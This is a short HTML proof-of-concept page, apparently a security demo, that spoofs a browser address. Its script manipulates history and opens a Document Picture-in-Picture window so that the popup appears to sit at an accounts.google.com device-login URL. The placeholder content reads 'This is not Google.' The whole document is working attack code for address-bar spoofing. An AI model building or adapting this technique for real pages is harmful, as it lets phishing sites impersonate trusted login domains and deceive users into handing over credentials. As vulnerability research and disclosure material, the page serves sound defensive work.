<!DOCTYPE html>
<html>

<head>
    <style>
        #content {
            display: none;
        }
    </style>
</head>

<body>
    <h1>Spoof Picture-in-Picture</h1>

    <button id="button">Spoof Button</button>

    <div id="content">
        This is not Google.
    </div>

    <script>
        const spoof = async () => {

            const protocol = encodeURIComponent('https');
            const hostname = encodeURIComponent('accounts.google.com');
            
            const spoofedURL = protocol + '://' + hostname + '/login/device/verify';

            history.pushState(null, '', '?' + spoofedURL);

            const popupPip = await documentPictureInPicture.requestWindow({
                width: 350,
                height: 400
            });

            setTimeout(() => {
                history.pushState(null, '', '/');
                popupPip.history.back();
            }, 1000);

            popupPip.document.body.append(content);
        };

        button.onclick = spoof;
    </script>
</body>

</html>
